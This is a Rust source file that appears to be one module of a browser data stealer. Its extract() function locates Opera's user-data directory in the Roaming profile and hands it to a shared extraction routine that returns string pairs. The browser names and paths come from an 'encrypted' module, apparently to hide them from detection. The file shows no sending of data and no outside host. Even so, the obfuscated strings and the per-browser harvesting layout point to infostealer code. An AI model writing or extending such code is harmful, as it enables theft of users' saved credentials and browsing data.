use super::base;
use crate::encrypted::*;

pub fn extract() -> Vec<(String, String)> {
    let user_data = crate::browsers::common::paths::user_data_path(
        &crate::browsers::common::paths::BrowserPath {
            name: s_browser_opera(),
            exe: s_path_opera_exe(),
            user_data_rel: s_path_opera_stable_ud_rel(),
            root: crate::browsers::common::paths::DataRoot::Roaming,
            has_profiles: false,
        }
    );
    base::extract_for_browser(&s_browser_opera(), &user_data, false)
}
